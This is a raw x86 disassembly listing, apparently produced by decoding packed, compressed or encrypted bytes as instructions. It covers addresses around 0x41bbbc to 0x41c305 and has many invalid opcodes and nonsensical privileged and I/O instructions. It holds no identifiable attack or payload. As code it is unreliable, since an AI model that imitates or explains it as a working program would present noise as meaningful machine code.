  41bbbc:	sub    al,0x59
  41bbbe:	dec    ebx
  41bbbf:	inc    esi
  41bbc0:	test   DWORD PTR [ebx-0x11c89efc],ebx
  41bbc6:	or     DWORD PTR [ebx],edx
  41bbc8:	fwait
  41bbc9:	ins    BYTE PTR es:[edi],dx
  41bbca:	xlat   BYTE PTR ds:[ebx]
  41bbcb:	or     esp,ebp
  41bbcd:	xor    DWORD PTR [edx+0x3aac5f4],ebx
  41bbd3:	loop   0x41bbb0
  41bbd5:	push   ds
  41bbd6:	imul   ecx,DWORD PTR [edx+0x53dc58d0],0xe41b9e52
  41bbe0:	mov    dl,0x7e
  41bbe2:	rcr    ch,0xaa
  41bbe5:	into   
  41bbe6:	push   ebx
  41bbe7:	ret    0xfada
  41bbea:	push   ebp
  41bbeb:	stos   BYTE PTR es:[edi],al
  41bbec:	pop    ss
  41bbed:	hlt    
  41bbee:	jmp    0x41bb7d
  41bbf0:	mov    DWORD PTR [esi],edx
  41bbf2:	dec    edi
  41bbf3:	or     DWORD PTR [eax],0x52
  41bbf6:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41bbf8:	add    al,0x4e
  41bbfa:	std    
  41bbfb:	in     eax,0xd4
  41bbfd:	xchg   BYTE PTR [ebx],cl
  41bbff:	dec    ebx
  41bc00:	lahf   
  41bc01:	cdq    
  41bc02:	outs   dx,DWORD PTR ds:[esi]
  41bc03:	inc    esp
  41bc04:	mov    esp,0x6a093d02
  41bc09:	or     DWORD PTR [edx+0x12dc5037],ebp
  41bc0f:	mov    edx,0x76722408
  41bc14:	ja     0x41bbd1
  41bc16:	sbb    al,0xed
  41bc18:	dec    ebp
  41bc19:	(bad)  
  41bc1b:	cli    
  41bc1c:	xor    esp,esi
  41bc1e:	ret    
  41bc1f:	ins    DWORD PTR es:[edi],dx
  41bc20:	(bad)  
  41bc21:	int3   
  41bc22:	jge    0x41bc54
  41bc24:	rcr    DWORD PTR [edi-0x388ebf49],0x7d
  41bc2b:	aas    
  41bc2c:	push   0x6372380a
  41bc31:	call   0x4c0:0x75af4db0
  41bc38:	sar    bl,cl
  41bc3a:	cld    
  41bc3b:	cmp    eax,0x253102eb
  41bc40:	adc    ecx,DWORD PTR ds:0x67656bf7
  41bc46:	in     al,0xfb
  41bc48:	dec    ebp
  41bc49:	cmc    
  41bc4a:	es imul ebp,esi,0x9825605f
  41bc51:	cld    
  41bc52:	scas   eax,DWORD PTR es:[edi]
  41bc53:	jne    0x41bca8
  41bc55:	jne    0x41bc26
  41bc57:	dec    esi
  41bc58:	outs   dx,BYTE PTR ds:[esi]
  41bc59:	or     esi,ebp
  41bc5b:	push   ebp
  41bc5c:	add    BYTE PTR [ecx],al
  41bc5e:	mov    cl,0xc8
  41bc60:	mov    bh,0x8d
  41bc62:	mov    ebp,0xba9e8c93
  41bc67:	jno    0x41bcc5
  41bc69:	push   esi
  41bc6a:	imul   eax,DWORD PTR [eax],0x1e
  41bc6d:	(bad)  
  41bc6e:	pop    ss
  41bc6f:	and    DWORD PTR [esi+0x68addcc0],eax
  41bc75:	(bad)  
  41bc77:	(bad)  
  41bc78:	mov    dl,0x9a
  41bc7a:	mov    al,0xb5
  41bc7c:	ror    DWORD PTR [eax+0x65b54441],1
  41bc82:	jno    0x41bc11
  41bc84:	cmp    al,0xed
  41bc86:	dec    ebx
  41bc87:	jecxz  0x41bcdf
  41bc89:	pop    eax
  41bc8a:	jne    0x41bcab
  41bc8c:	and    al,0xe4
  41bc8e:	fsub   DWORD PTR [ecx-0x74]
  41bc91:	rep stos BYTE PTR es:[edi],al
  41bc93:	mov    dl,0x4c
  41bc95:	or     al,0xbb
  41bc97:	test   al,0x62
  41bc99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc9a:	(bad)  
  41bc9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc9c:	adc    al,0x76
  41bc9e:	mov    ds:0xe0a6df56,al
  41bca3:	or     al,0xd6
  41bca5:	call   0x5fd4e5d2
  41bcaa:	inc    ecx
  41bcab:	push   0x616c9770
  41bcb0:	xor    BYTE PTR [eax],ah
  41bcb2:	mov    eax,ds:0x5275d090
  41bcb7:	push   0xffffff9a
  41bcb9:	push   cs
  41bcba:	ret    0x87cb
  41bcbd:	mov    esi,0x6f38986b
  41bcc2:	and    BYTE PTR [eax+0x2],dl
  41bcc5:	inc    edx
  41bcc6:	gs xor eax,0x3a53d3d7
  41bccc:	das    
  41bccd:	mov    cl,0x5a
  41bccf:	add    al,0x5e
  41bcd1:	xchg   ecx,eax
  41bcd2:	ins    BYTE PTR es:[edi],dx
  41bcd3:	mov    eax,ds:0xa91d867d
  41bcd8:	out    dx,eax
  41bcd9:	pushf  
  41bcda:	push   0xfde651c3
  41bcdf:	inc    ebp
  41bce0:	xor    al,0x79
  41bce2:	adc    dl,al
	...
  41bcf0:	add    ah,bh
  41bcf2:	mov    WORD PTR [ebx+edx*8-0x5000040c],?
  41bcf9:	and    al,0xd
  41bcfb:	jmp    0x41bd54
  41bcfd:	add    DWORD PTR [ebp-0x2c],esi
  41bd00:	ja     0x41bcbf
  41bd02:	cmp    DWORD PTR [ecx],eax
  41bd04:	add    BYTE PTR [ebx-0x33fffffd],ch
  41bd0a:	or     edi,DWORD PTR [eax+eiz*4-0x3b]
  41bd0e:	lods   al,BYTE PTR ds:[esi]
  41bd0f:	in     eax,0x1d
  41bd11:	xchg   di,ax
  41bd13:	or     eax,0x4263cec1
  41bd18:	xchg   DWORD PTR [esi],ebx
  41bd1a:	mov    ebx,ebp
  41bd1c:	cmp    ch,BYTE PTR [esi+eax*1+0x2e4264fc]
  41bd23:	xchg   esi,eax
  41bd24:	dec    ebp
  41bd25:	push   0xf
  41bd27:	add    BYTE PTR ds:0xb25d4ab7,dl
  41bd2d:	loop   0x41bccc
  41bd2f:	adc    DWORD PTR [edx],esp
  41bd31:	and    esi,DWORD PTR [ebp+0x5bdd834b]
  41bd37:	add    ah,BYTE PTR [ecx-0x22]
  41bd3a:	sub    al,0xcd
  41bd3c:	call   0x713f6ee0
  41bd41:	pusha  
  41bd42:	and    eax,0x90a43cb8
  41bd47:	xchg   ebp,eax
  41bd48:	lods   ax,WORD PTR ds:[esi]
  41bd4a:	cmc    
  41bd4b:	adc    BYTE PTR [esi-0x30aa4be1],cl
  41bd51:	jo     0x41bd76
  41bd53:	or     DWORD PTR [edi],esp
  41bd55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd56:	push   ds
  41bd57:	xchg   DWORD PTR [edi-0x7ddac3e3],esi
  41bd5d:	sti    
  41bd5e:	mov    dh,0xc6
  41bd60:	outs   dx,BYTE PTR ds:[esi]
  41bd61:	retf   0x1de3
  41bd64:	jge    0x41bd40
  41bd66:	pop    esi
  41bd67:	add    ebx,esp
  41bd69:	jns    0x41bd6c
  41bd6b:	inc    esp
  41bd6c:	fmulp  st(7),st
  41bd6e:	aad    0x1e
  41bd70:	es sub dl,bl
  41bd73:	test   eax,0x4b1a2615
  41bd78:	scas   al,BYTE PTR es:[edi]
  41bd79:	out    0x4b,eax
  41bd7b:	add    BYTE PTR [edx-0x52],bl
  41bd7e:	out    0xaf,al
  41bd80:	ds cmp al,0xcc
  41bd83:	inc    ebp
  41bd84:	mov    cs,WORD PTR [ecx]
  41bd86:	adc    eax,0xb3ef5dce
  41bd8b:	dec    edi
  41bd8c:	or     ebp,ebx
  41bd8e:	data16 js 0x41bd53
  41bd91:	mov    al,ds:0x8c994643
  41bd96:	xlat   BYTE PTR ds:[ebx]
  41bd97:	(bad)  [edi-0x6e27559c]
  41bd9d:	jle    0x41bdf0
  41bd9f:	or     BYTE PTR [ebp+0x5273636],dh
  41bda5:	ja     0x41be1a
  41bda7:	cmp    BYTE PTR ds:0x75d5f01e,bh
  41bdad:	int    0xf5
  41bdaf:	in     eax,0xe
  41bdb1:	retf   
  41bdb2:	push   ds
  41bdb3:	ror    BYTE PTR [edi],cl
  41bdb5:	out    dx,al
  41bdb6:	mov    ebp,0xd2456fad
  41bdbb:	popf   
  41bdbc:	cmp    eax,0xdae38b45
  41bdc1:	mov    bl,BYTE PTR ds:0xfd6ef51d
  41bdc7:	or     al,BYTE PTR [ebx+eax*8-0x7bd15664]
  41bdce:	jae    0x41be41
  41bdd0:	loopne 0x41bd71
  41bdd2:	cmp    DWORD PTR [eax+0x5734414f],edi
  41bdd8:	jae    0x41bd67
  41bdda:	ror    DWORD PTR [eax+0x7c],1
  41bddd:	daa    
  41bdde:	rcr    DWORD PTR [ebx-0x5f],cl
  41bde1:	stos   BYTE PTR es:[edi],al
  41bde2:	shl    BYTE PTR [edx-0x567677ad],cl
  41bde8:	and    DWORD PTR [esi],esp
  41bdea:	adc    ebx,esi
  41bdec:	push   eax
  41bded:	inc    ebp
  41bdee:	cwde   
  41bdef:	xchg   ah,bl
  41bdf1:	pop    es
  41bdf2:	xchg   edx,eax
  41bdf3:	leave  
  41bdf4:	add    dl,bh
  41bdf6:	cmp    edx,ebp
  41bdf8:	pop    ebx
  41bdf9:	daa    
  41bdfa:	mov    fs,WORD PTR [eax+ebp*2]
  41bdfd:	lahf   
  41bdfe:	out    dx,eax
  41bdff:	cmc    
  41be00:	mov    ch,0x7d
  41be02:	mov    WORD PTR [edx-0x732ac45e],?
  41be08:	(bad)  
  41be09:	lods   eax,DWORD PTR ds:[esi]
  41be0a:	adc    WORD PTR [ecx+0x6f],bx
  41be0e:	pop    es
  41be0f:	sub    dh,bh
  41be11:	xor    edx,DWORD PTR [edx+0xe1b1e11]
  41be17:	inc    esi
  41be18:	jmp    edx
  41be1a:	imul   ebp,DWORD PTR [ecx-0x67ad278b],0xa
  41be21:	jl     0x41bda5
  41be23:	lods   al,BYTE PTR ds:[esi]
  41be24:	fnstcw WORD PTR [edi-0x2bb9cf94]
  41be2a:	dec    edx
  41be2b:	outs   dx,DWORD PTR ds:[esi]
  41be2c:	push   ebp
  41be2d:	fadd   DWORD PTR [edi-0x5e5306b]
  41be33:	jae    0x41be5a
  41be35:	ret    
  41be36:	loopne 0x41be9b
  41be38:	jae    0x41be9a
  41be3a:	push   ebx
  41be3b:	cmp    BYTE PTR [ebx-0x7d7d624],ah
  41be41:	(bad)  
  41be42:	cs or  al,0xb5
  41be45:	int3   
  41be46:	imul   eax,eax,0xffffffef
  41be49:	fs mov dh,0xb5
  41be4c:	sar    ecx,cl
  41be4e:	dec    edx
  41be4f:	inc    esi
  41be50:	test   DWORD PTR [edi],0x47465506
  41be56:	cmp    bh,al
  41be58:	push   ebx
  41be59:	sbb    ebx,edi
  41be5b:	dec    ecx
  41be5c:	xor    al,0x85
  41be5e:	push   ebx
  41be5f:	(bad)  
  41be60:	lods   eax,DWORD PTR ds:[si]
  41be62:	test   al,0xa
  41be64:	adc    bh,dh
  41be66:	adc    DWORD PTR [ebx+edx*1],0xffffffd1
  41be6a:	add    BYTE PTR [ebx-0x1b],0xeb
  41be6e:	or     DWORD PTR [esi+0x63],ebp
  41be71:	sub    al,0x8c
  41be73:	dec    esi
  41be74:	push   esi
  41be75:	xchg   esp,eax
  41be76:	mov    bh,0x18
  41be78:	jp     0x41be69
  41be7a:	repz les edx,FWORD PTR [edx-0x28]
  41be7e:	sbb    al,0x2b
  41be80:	mov    edx,0x95f396a
  41be85:	lock jmp 0x41beeb
  41be88:	mov    al,0x11
  41be8a:	(bad)  
  41be8c:	scas   eax,DWORD PTR es:[edi]
  41be8d:	xor    edx,ebp
  41be8f:	call   0xe883:0xa7ec74e0
  41be96:	push   ds
  41be97:	loopne 0x41bf05
  41be99:	or     DWORD PTR [edx+0x4add8c4e],ebp
  41be9f:	mov    ecx,0x4f2dd6b8
  41bea4:	adc    al,0xa0
  41bea6:	nop
  41bea7:	or     al,BYTE PTR [eax]
  41bea9:	adc    cl,dl
  41beab:	mov    eax,0xc853ac9e
  41beb0:	push   edx
  41beb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41beb2:	das    
  41beb3:	repz add eax,0xd2bbc86c
  41beb9:	outs   dx,DWORD PTR ds:[esi]
  41bebb:	scas   eax,DWORD PTR es:[edi]
  41bebc:	mov    eax,ds:0xf7a9978
  41bec1:	adc    eax,0xd28eb796
  41bec6:	cs sub eax,0xa0baa694
  41becc:	mov    ds:0x720869cb,eax
  41bed1:	push   ecx
  41bed2:	or     DWORD PTR [edx+eax*2],ebp
  41bed5:	out    dx,eax
  41bed6:	mov    WORD PTR [edi+0x317356a0],fs
  41bedc:	fbld   TBYTE PTR [esi-0x55]
  41bedf:	ja     0x41bf41
  41bee1:	push   eax
  41bee2:	cwde   
  41bee3:	mov    dh,BYTE PTR [eax-0x1cbf33f0]
  41bee9:	pop    esp
  41beea:	je     0x41bf4a
  41beec:	(bad)  
  41beed:	(bad)  
  41beee:	ds sub eax,0x654acff4
  41bef4:	out    dx,al
  41bef5:	pop    ds
  41bef6:	fstp   DWORD PTR ds:0x6d48511d
  41befc:	mov    cl,0x40
  41befe:	sbb    ah,BYTE PTR [esi-0x35]
  41bf01:	repnz add esp,DWORD PTR [ecx+0x64c82e6d]
  41bf08:	push   cs
  41bf09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf0a:	mov    ch,0xa0
  41bf0c:	in     al,dx
  41bf0d:	jb     0x41beb0
  41bf0f:	xchg   BYTE PTR [ebp-0x63],al
  41bf12:	adc    edx,DWORD PTR [edi+0x742f87a2]
  41bf18:	add    BYTE PTR [eax-0x3d82d972],dh
  41bf1e:	and    eax,ebp
  41bf20:	shl    edx,1
  41bf22:	into   
  41bf23:	adc    al,0x2
  41bf25:	outs   dx,BYTE PTR ds:[esi]
  41bf26:	outs   dx,DWORD PTR ds:[esi]
  41bf27:	mov    al,ds:0xff72252a
  41bf2c:	cmp    esp,DWORD PTR [edi+0x19]
  41bf2f:	adc    ecx,edx
  41bf31:	imul   edx,DWORD PTR [edi+0x52a2f1e7],0xb4c02fc2
  41bf3b:	add    eax,0x845e56a3
  41bf40:	jb     0x41becb
  41bf42:	inc    esp
  41bf43:	sub    eax,0x8a286a5d
  41bf48:	and    dh,al
  41bf4a:	and    DWORD PTR [edx],ebp
  41bf4c:	sbb    dl,bh
  41bf4e:	adc    cl,BYTE PTR [ebx+0x2dd9a957]
  41bf54:	call   0x6a4c:0x26de1854
  41bf5b:	and    cl,BYTE PTR [esi-0x2f]
  41bf5e:	sub    DWORD PTR [eax-0x3d],0x2e
  41bf62:	ret    0x7d32
  41bf65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf66:	(bad)  
  41bf67:	les    esi,FWORD PTR [esi]
  41bf69:	shr    BYTE PTR [ecx+ebp*4+0x3f],0xc4
  41bf6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf6f:	data16 aas 
  41bf71:	(bad)  
  41bf72:	dec    ecx
  41bf73:	sbb    al,0xcb
  41bf75:	sub    DWORD PTR gs:[ebx],edx
  41bf78:	sbb    ebp,ebx
  41bf7a:	xor    esi,DWORD PTR [eax-0x1d1ba260]
  41bf80:	ins    BYTE PTR es:[edi],dx
  41bf81:	pop    ds
  41bf82:	repz popa 
  41bf84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf85:	sub    edi,esi
  41bf87:	daa    
  41bf88:	adc    cl,0xa4
  41bf8b:	jg     0x41c001
  41bf8d:	rcr    DWORD PTR [edx+0x48],cl
  41bf90:	jo     0x41bf7f
  41bf92:	push   esp
  41bf93:	sub    esp,ebp
  41bf95:	and    DWORD PTR [ebx+0x389b0bfb],ebx
  41bf9b:	(bad)  
  41bf9c:	cmp    eax,0xf9480526
  41bfa1:	inc    eax
  41bfa2:	ss and cx,cx
  41bfa6:	jb     0x41bffb
  41bfa8:	mov    esp,0xf48a3d01
  41bfad:	out    0x69,eax
  41bfaf:	int3   
  41bfb0:	idiv   BYTE PTR [ecx-0xba6f3ca]
  41bfb6:	jb     0x41bfc8
  41bfb8:	inc    eax
  41bfb9:	das    
  41bfba:	jb     0x41c012
  41bfbc:	pop    ebx
  41bfbd:	push   0xad0614d1
  41bfc2:	push   eax
  41bfc3:	fs std 
  41bfc5:	(bad)  
  41bfc6:	imul   esi,DWORD PTR [ecx+0x29],0x63f763c6
  41bfcd:	mov    cl,0xee
  41bfcf:	data16 sub BYTE PTR ds:0x29e08ac1,0xd
  41bfd7:	sbb    DWORD PTR [edx],eax
  41bfd9:	ins    BYTE PTR es:[edi],dx
  41bfda:	das    
  41bfdb:	std    
  41bfdc:	outs   dx,DWORD PTR ds:[esi]
  41bfdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfde:	fsubr  QWORD PTR [ecx-0x2f]
  41bfe1:	imul   edx,DWORD PTR [ecx+ecx*8-0x1417f0ca],0xc7045624
  41bfec:	adc    eax,0xe10c2183
  41bff1:	loopne 0x41c033
  41bff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bff4:	test   bh,dh
  41bff6:	(bad)  
  41bff8:	xchg   ebp,eax
  41bff9:	push   esi
  41bffa:	push   ecx
  41bffb:	pop    ds
  41bffc:	sahf   
  41bffd:	fs test al,0xc3
  41c000:	mov    ds:0x9f142770,al
  41c005:	mov    edx,0xb31b1522
  41c00a:	add    bh,bl
  41c00c:	pop    ebx
  41c00d:	outs   dx,DWORD PTR ds:[esi]
  41c00e:	push   ds
  41c00f:	jl     0x41c06b
  41c011:	scas   al,BYTE PTR es:[edi]
  41c012:	mov    ss,WORD PTR [edx-0x51]
  41c015:	sbb    ch,ah
  41c017:	gs xchg ebx,eax
  41c019:	(bad)  
  41c01a:	out    dx,al
  41c01b:	push   es
  41c01c:	pop    ebp
  41c01d:	adc    DWORD PTR [ebp-0x37],ebp
  41c020:	lds    ecx,FWORD PTR [eax]
  41c022:	popf   
  41c023:	clc    
  41c024:	add    eax,0xa3c7fed7
  41c029:	pusha  
  41c02a:	(bad)  
  41c02b:	xor    DWORD PTR [ebp-0x55be143a],ebp
  41c031:	jne    0x41bfca
  41c033:	or     eax,0x49eb7abf
  41c038:	dec    edx
  41c039:	ins    DWORD PTR es:[edi],dx
  41c03a:	xchg   DWORD PTR [esi-0x77],esi
  41c03d:	pop    ebx
  41c03e:	test   DWORD PTR [ebx-0x41],edi
  41c041:	dec    ebp
  41c042:	jg     0x41c095
  41c044:	test   ch,bl
  41c046:	mov    bl,0xc7
  41c048:	sub    al,0xf0
  41c04a:	mov    ecx,0x7cc62e7b
  41c04f:	dec    edi
  41c050:	sbb    BYTE PTR [ecx],cl
  41c052:	addr16 popf 
  41c054:	loope  0x41c0c6
  41c056:	push   edx
  41c057:	adc    ebp,0xb75b5490
  41c05d:	(bad)  
  41c05e:	cmp    BYTE PTR [eax+edx*1+0x32f056d5],dh
  41c065:	lods   eax,DWORD PTR ds:[esi]
  41c066:	int    0xa7
  41c068:	dec    ecx
  41c069:	sbb    eax,esi
  41c06b:	dec    eax
  41c06c:	push   es
  41c06d:	adc    DWORD PTR [eax-0x6b],edi
  41c070:	shr    eax,cl
  41c072:	mov    esi,0x7aef2f3
  41c077:	cmp    bl,0xcd
  41c07a:	clc    
  41c07b:	sub    BYTE PTR [ecx+ebx*4+0x4b804ef0],cl
  41c082:	stos   DWORD PTR es:[edi],eax
  41c083:	in     eax,0xed
  41c085:	neg    DWORD PTR [ebx]
  41c087:	pop    esi
  41c088:	sub    ch,ch
  41c08a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c08b:	xchg   edx,eax
  41c08c:	sbb    BYTE PTR [ebx],bh
  41c08e:	not    BYTE PTR [ebx-0x7d]
  41c091:	std    
  41c092:	pop    ecx
  41c093:	(bad)  
  41c094:	cmp    BYTE PTR [ecx-0x5e],cl
  41c097:	imul   eax,DWORD PTR [eax],0x6e80be23
  41c09d:	and    al,0xfc
  41c09f:	push   edx
  41c0a0:	xchg   edx,eax
  41c0a1:	add    cl,al
  41c0a3:	pop    ss
  41c0a4:	mov    BYTE PTR ds:0x7b9f82c8,0x73
  41c0ab:	adc    bl,BYTE PTR [ebp+0x78]
  41c0ae:	cli    
  41c0af:	enter  0xef3b,0x58
  41c0b3:	push   ebx
	...
  41c0c0:	add    bl,cl
  41c0c2:	test   al,0x91
  41c0c4:	sbb    eax,0xfecf3df3
  41c0c9:	dec    ebp
  41c0ca:	fisub  DWORD PTR [ecx+edi*1+0x75]
  41c0ce:	or     edx,DWORD PTR [ecx]
  41c0d0:	fldcw  WORD PTR [eax+0x3d]
  41c0d3:	add    DWORD PTR [eax],eax
  41c0d5:	stos   DWORD PTR es:[edi],eax
  41c0d6:	add    eax,DWORD PTR [eax]
  41c0d8:	add    cl,bh
  41c0da:	enter  0x7f0,0x20
  41c0de:	cli    
  41c0df:	sbb    esp,DWORD PTR [esi]
  41c0e1:	push   0xffffffd4
  41c0e3:	popf   
  41c0e4:	inc    ebp
  41c0e5:	adc    al,0x2f
  41c0e7:	mov    edi,DWORD PTR [ebp-0x5a6a0afe]
  41c0ed:	jae    0x41c089
  41c0ef:	(bad)  
  41c0f0:	in     eax,dx
  41c0f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0f2:	nop
  41c0f3:	bound  ebx,QWORD PTR [esp+ebx*8-0x4454abce]
  41c0fa:	arpl   WORD PTR [ecx],di
  41c0fc:	jae    0x41c0b3
  41c0fe:	pop    ebx
  41c0ff:	in     eax,dx
  41c100:	jl     0x41c08c
  41c102:	cdq    
  41c103:	jl     0x41c0e3
  41c105:	cmp    al,0xf0
  41c107:	out    0x28,eax
  41c109:	addr16 push ebx
  41c10b:	mov    dl,0xc
  41c10d:	sbb    ebp,DWORD PTR [ecx-0x62]
  41c110:	dec    esi
  41c111:	adc    cl,ah
  41c113:	sbb    ebx,DWORD PTR [edi+0x3c]
  41c116:	push   eax
  41c117:	loop   0x41c15f
  41c119:	in     eax,dx
  41c11a:	das    
  41c11b:	iret   
  41c11c:	stos   DWORD PTR es:[edi],eax
  41c11d:	cld    
  41c11e:	adc    eax,0x80f0d3e0
  41c123:	xchg   edx,eax
  41c124:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c125:	lahf   
  41c126:	out    0xad,al
  41c128:	cmc    
  41c129:	das    
  41c12a:	rcr    DWORD PTR [ebx-0x46d3131e],1
  41c130:	sbb    ebp,eax
  41c132:	ret    
  41c133:	xor    edi,ebx
  41c135:	aaa    
  41c136:	sub    al,0x3e
  41c138:	or     al,0x8a
  41c13a:	lahf   
  41c13b:	imul   edi,DWORD PTR [ecx-0x1915478f],0x22
  41c142:	inc    eax
  41c143:	pusha  
  41c144:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c145:	test   eax,0x14390f4b
  41c14a:	jno    0x41c184
  41c14c:	fiadd  WORD PTR [edx]
  41c14e:	mov    ebp,gs
  41c150:	js     0x41c0fc
  41c152:	ins    BYTE PTR es:[edi],dx
  41c153:	inc    ecx
  41c154:	sbb    BYTE PTR [edx-0xc],bh
  41c157:	push   ds
  41c158:	(bad)  
  41c159:	and    cl,BYTE PTR [ebx+0x2d]
  41c15c:	adc    DWORD PTR [ecx],ebp
  41c15e:	inc    esi
  41c15f:	mov    dl,0xa5
  41c161:	mov    WORD PTR [eax-0x68a08b43],ss
  41c167:	or     BYTE PTR [edi+0xbd5ef8d],bh
  41c16d:	add    DWORD PTR [eax-0x65d83c76],edx
  41c173:	test   eax,0x30da0d0a
  41c178:	fbstp  TBYTE PTR [ebp-0x3a]
  41c17b:	mov    al,0xcb
  41c17d:	mov    cs,ebp
  41c17f:	ret    
  41c180:	jne    0x41c14e
  41c182:	fist   WORD PTR [edi-0x4a655721]
  41c188:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c189:	xchg   ebp,eax
  41c18a:	xchg   dl,bh
  41c18c:	repnz clc 
  41c18e:	ror    ecx,cl
  41c190:	loope  0x41c1fb
  41c192:	mov    eax,0xfa0c2f22
  41c197:	daa    
  41c198:	mov    esp,0x4fc263d0
  41c19d:	call   0x4d21:0xae2cf85a
  41c1a4:	call   DWORD PTR [edx]
  41c1a6:	rcr    BYTE PTR [esi+0x0],1
  41c1a9:	fwait
  41c1aa:	mov    eax,ds:0x1cb7998c
  41c1af:	sahf   
  41c1b0:	fs dec ecx
  41c1b2:	jecxz  0x41c17a
  41c1b4:	add    ch,BYTE PTR [ecx-0x6]
  41c1b7:	(bad)
  41c1ba:	sbb    cl,dl
  41c1bc:	xchg   esp,eax
  41c1bd:	je     0x41c182
  41c1bf:	rol    ecx,0xc4
  41c1c2:	jmp    0xb9fa:0x29823c6e
  41c1c9:	mov    ds:0x5c6e3109,eax
  41c1ce:	ins    BYTE PTR es:[edi],dx
  41c1cf:	cmp    DWORD PTR [eax],esp
  41c1d1:	or     ah,BYTE PTR [edi+edi*4+0x47ff8cba]
  41c1d8:	push   ebp
  41c1d9:	pop    ebp
  41c1da:	mov    bl,0xbb
  41c1dc:	rcl    BYTE PTR [ebx-0x5e66a988],0x34
  41c1e3:	js     0x41c1ea
  41c1e5:	loope  0x41c264
  41c1e7:	call   0x92811397
  41c1ec:	cmp    eax,0x7073caea
  41c1f1:	je     0x41c210
  41c1f3:	mov    cl,0xf2
  41c1f5:	pop    esp
  41c1f6:	pop    esp
  41c1f7:	xor    edx,DWORD PTR [ebp+0x645d75b6]
  41c1fd:	ficom  DWORD PTR [ecx+0x65b5f1f6]
  41c203:	fwait
  41c204:	retf   0xa24b
  41c207:	xor    ah,BYTE PTR [edi+0x3214e51e]
  41c20d:	push   0x3b
  41c20f:	sbb    al,0x7e
  41c211:	hlt    
  41c212:	cmp    ebp,0x31
  41c215:	add    dl,BYTE PTR [ebp+0x2190eb8e]
  41c21b:	jmp    0x41c1ae
  41c21d:	push   esi
  41c21e:	test   DWORD PTR [esi],ebp
  41c220:	into   
  41c221:	jb     0x41c245
  41c223:	xchg   ebx,eax
  41c224:	inc    esi
  41c225:	inc    esp
  41c226:	pop    eax
  41c227:	or     al,0x2a
  41c229:	xchg   DWORD PTR [eax+0x20],esp
  41c22c:	int3   
  41c22d:	ja     0x41c232
  41c22f:	inc    esi
  41c230:	jbe    0x41c27f
  41c232:	loop   0x41c1d1
  41c234:	lods   al,BYTE PTR ds:[esi]
  41c235:	cmp    al,0xe0
  41c237:	lahf   
  41c238:	enter  0xf34,0x9f
  41c23c:	sub    DWORD PTR [esi+0xd8dedb5],0x7b673ad1
  41c246:	sub    DWORD PTR [ebx+ecx*1-0x74],0xffffff89
  41c24b:	mov    eax,0xe031c2c
  41c250:	or     ebx,DWORD PTR [eax]
  41c252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c253:	shr    DWORD PTR [ecx+0x27d5a5b7],1
  41c259:	inc    esi
  41c25a:	imul   ecx,DWORD PTR [eax],0x399b11ef
  41c260:	scas   eax,DWORD PTR es:[edi]
  41c261:	es jg  0x41c1ed
  41c264:	dec    ebx
  41c265:	mov    eax,ds:0x9920a2ff
  41c26a:	loope  0x41c2eb
  41c26c:	pop    ebp
  41c26d:	loop   0x41c203
  41c26f:	xchg   ebp,eax
  41c270:	loopne 0x41c1fd
  41c272:	xchg   esp,eax
  41c273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c274:	mov    al,0x34
  41c276:	push   edx
  41c277:	pop    edx
  41c278:	fst    DWORD PTR [ebx]
  41c27a:	clc    
  41c27b:	xor    DWORD PTR [edx],esi
  41c27d:	retf   0x1b97
  41c280:	pop    edx
  41c281:	cmp    ebp,esp
  41c283:	imul   ebx,esp,0xb4f7c053
  41c289:	sub    eax,DWORD PTR [ebp+0x66]
  41c28c:	jno    0x41c2fd
  41c28e:	fdivp  st(3),st
  41c290:	mov    BYTE PTR ds:0x9a528dbb,0x25
  41c297:	cmp    bl,bl
  41c299:	xor    BYTE PTR [ebp-0x1e],cl
  41c29c:	ds mov ecx,0x665463ee
  41c2a2:	xchg   ebp,eax
  41c2a3:	lea    esp,[edi+0x5c05a9b8]
  41c2a9:	sbb    DWORD PTR [ebp+0x694c1fe8],esi
  41c2af:	cdq    
  41c2b0:	xchg   esp,eax
  41c2b1:	loop   0x41c2df
  41c2b3:	shl    BYTE PTR [ebx-0x62],0x5f
  41c2b7:	(bad)  
  41c2b8:	and    edi,DWORD PTR cs:[ebp-0x59]
  41c2bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2bd:	hlt    
  41c2be:	add    DWORD PTR [ebx-0x4edd0eb6],edi
  41c2c4:	shl    DWORD PTR [ecx-0x63],0xfc
  41c2c8:	in     eax,dx
  41c2c9:	in     eax,dx
  41c2ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2cb:	nop
  41c2cc:	retf   
  41c2cd:	lods   eax,DWORD PTR ds:[esi]
  41c2ce:	pop    es
  41c2cf:	aad    0xd1
  41c2d1:	sbb    al,0xba
  41c2d3:	mov    ds,WORD PTR [ebp-0xd647d59]
  41c2d9:	push   edi
  41c2da:	jae    0x41c29f
  41c2dc:	xor    esp,DWORD PTR [edx-0x264e3ed0]
  41c2e2:	inc    ebp
  41c2e3:	outs   dx,DWORD PTR ds:[esi]
  41c2e4:	xchg   edi,eax
  41c2e5:	call   0x2fcd:0xc8f4360b
  41c2ec:	push   cs
  41c2ed:	mov    al,BYTE PTR [esi+0x2931db50]
  41c2f3:	add    DWORD PTR [eax+edi*8],ecx
  41c2f6:	ficom  WORD PTR [edi-0x10]
  41c2f9:	mov    WORD PTR [esi+esi*8],cs
  41c2fc:	fnstenv [esi]
  41c2fe:	jmp    0xdef80bf3
  41c303:	cs push ecx
  41c305:	jle    0x41c308
